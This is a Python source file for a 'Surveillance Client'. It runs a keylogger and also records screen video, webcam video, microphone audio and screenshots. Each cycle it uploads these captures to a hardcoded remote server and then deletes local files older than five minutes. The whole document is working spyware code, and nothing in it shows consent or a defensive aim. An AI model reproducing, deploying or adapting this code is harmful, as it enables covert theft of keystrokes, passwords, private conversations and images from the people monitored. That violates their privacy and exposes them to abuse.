#!/usr/bin/env python3
"""
Surveillance Client - Records screen, webcam, audio, and keystrokes
"""
import os
import sys
import glob
import time
import datetime
import requests
import numpy as np
import pyautogui
import keyboard
import pyaudio
import wave
from threading import Timer, Thread
import cv2
import psutil
import subprocess
import platform

# Configuration
CONFIG = {
 #   "flask_server_url": "http://127.0.0.1:5000/upload",
    "flask_server_url": "http://10.218.248.236:5000/upload",
    "upload_interval": 60,  # seconds
    "max_file_age": 300,  # seconds
    "screen_duration": 30,
    "video_duration": 30,
    "audio_duration": 30,
 #   "keylog_interval": 30,
    "max_retries": 3,
    "upload_timeout": 10,
    "data_dir": "client_data"
}

# Global variables
uploaded_files = set()
kl = None
stop_recording = False

# Create data directory
os.makedirs(CONFIG["data_dir"], exist_ok=True)

def get_timestamp():
    return datetime.datetime.now().strftime('%Y%m%d_%H%M%S')

def get_system_info():
    try:
        return {
            "platform": platform.platform(),
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "processor": platform.processor(),
            "cpu_cores": psutil.cpu_count(),
            "total_ram": f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
            "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "current_user": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
            "current_time": get_timestamp()
        }
    except Exception as e:
        return {"error": str(e)}

class Keylogger:
    SEND_REPORT_EVERY = 60  # in seconds

    def __init__(self, interval=SEND_REPORT_EVERY, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()
        self.timer = None

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        filename = os.path.join(CONFIG["data_dir"], f"keylog_{get_timestamp()}.txt")
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(self.log)
            print(f"[+] Keylog saved: {filename}")
        except Exception as e:
            print(f"[-] Keylog error: {e}")
        # filename = f"keylog_{self.start_dt.strftime('%Y%m%d%H%M%S')}_{self.end_dt.strftime('%Y%m%d%H%M%S')}.txt"
        # with open(filename, "w") as f:
            # f.write(self.log)
        # print(f"[+] Saved {filename}")

    def report(self):
        self.end_dt = datetime.datetime.now()
        if self.log:
            self.report_to_file()
            self.start_dt = datetime.datetime.now()
            self.log = ""
        self.timer = Timer(self.interval, self.report)
        self.timer.start()

    def start(self):
        self.timer = Timer(self.interval, self.report)
        self.timer.start()
        keyboard.on_release(self.callback)

    def stop(self):
        if self.timer:
            self.timer.cancel()
        keyboard.unhook_all()

def record_screen(duration=CONFIG["screen_duration"]):
    filename = os.path.join(CONFIG["data_dir"], f"screen_{get_timestamp()}.avi")
    try:
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(filename, fourcc, 10.0, screen_size)
        
        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(0.1)
        
        out.release()
        print(f"[+] Screen recorded: {filename}")
    except Exception as e:
        print(f"[-] Screen error: {e}")

def record_webcam(duration=CONFIG["video_duration"]):
    filename = os.path.join(CONFIG["data_dir"], f"webcam_{get_timestamp()}.avi")
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
        
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            time.sleep(0.05)
        
        cap.release()
        out.release()
        print(f"[+] Webcam recorded: {filename}")
    except Exception as e:
        print(f"[-] Webcam error: {e}")

def record_audio(duration=CONFIG["audio_duration"]):
    filename = os.path.join(CONFIG["data_dir"], f"audio_{get_timestamp()}.wav")
    try:
        chunk = 1024
        fmt = pyaudio.paInt16
        channels = 1
        rate = 44100

        p = pyaudio.PyAudio()
        stream = p.open(format=fmt, channels=channels, rate=rate, 
                       input=True, frames_per_buffer=chunk)

        frames = []
        start_time = time.time()
        while time.time() - start_time < duration:
            data = stream.read(chunk)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(fmt))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
        
        print(f"[+] Audio recorded: {filename}")
    except Exception as e:
        print(f"[-] Audio error: {e}")

def take_screenshot():
    filename = os.path.join(CONFIG["data_dir"], f"screenshot_{get_timestamp()}.png")
    try:
        pyautogui.screenshot(filename)
        print(f"[+] Screenshot: {filename}")
    except Exception as e:
        print(f"[-] Screenshot error: {e}")

def upload_files():
    patterns = ["screen_*.avi", "webcam_*.avi", "audio_*.wav", "keylog_*.txt", "screenshot_*.png"]
    files = []
    for pattern in patterns:
        files.extend(glob.glob(os.path.join(CONFIG["data_dir"], pattern)))
    
    for file_path in files:
        if not os.path.exists(file_path):
            continue
            
        file_id = (file_path, os.path.getmtime(file_path))
        if file_id in uploaded_files:
            continue
            
        for attempt in range(CONFIG["max_retries"]):
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(
                        CONFIG["flask_server_url"],
                        files={'file': (os.path.basename(file_path), f)},
                        timeout=CONFIG["upload_timeout"]
                    )
                    
                if response.status_code == 200:
                    print(f"[+] Uploaded: {os.path.basename(file_path)}")
                    uploaded_files.add(file_id)
                    break
                else:
                    print(f"[-] Upload failed: {response.status_code}")
            except Exception as e:
                print(f"[-] Upload error: {e}")
            
            if attempt < CONFIG["max_retries"] - 1:
                time.sleep(2)

def cleanup_old_files():
    current_time = time.time()
    for file_path in glob.glob(os.path.join(CONFIG["data_dir"], "*")):
        if os.path.isfile(file_path):
            file_age = current_time - os.path.getctime(file_path)
            if file_age > CONFIG["max_file_age"]:
                try:
                    os.remove(file_path)
                    print(f"[+] Cleaned: {os.path.basename(file_path)}")
                except:
                    pass

def main():
    print("=== Surveillance Client Started ===")
    print(f"Server: {CONFIG['flask_server_url']}")
    print(f"Data Dir: {CONFIG['data_dir']}")
    
    # Start keylogger
    global kl
    kl = Keylogger()
    kl.start()
    
    try:
        while True:
            cleanup_old_files()
            
            # Start recordings in threads
            threads = [
                Thread(target=record_screen),
                Thread(target=record_webcam),
                Thread(target=record_audio),
                Thread(target=take_screenshot)
            ]
            
            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
            
            # Upload files
            upload_files()
            
            # Wait for next cycle
            time.sleep(CONFIG["upload_interval"])
            
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        if kl:
            kl.stop()
        print("[+] Client stopped")

if __name__ == "__main__":
    main()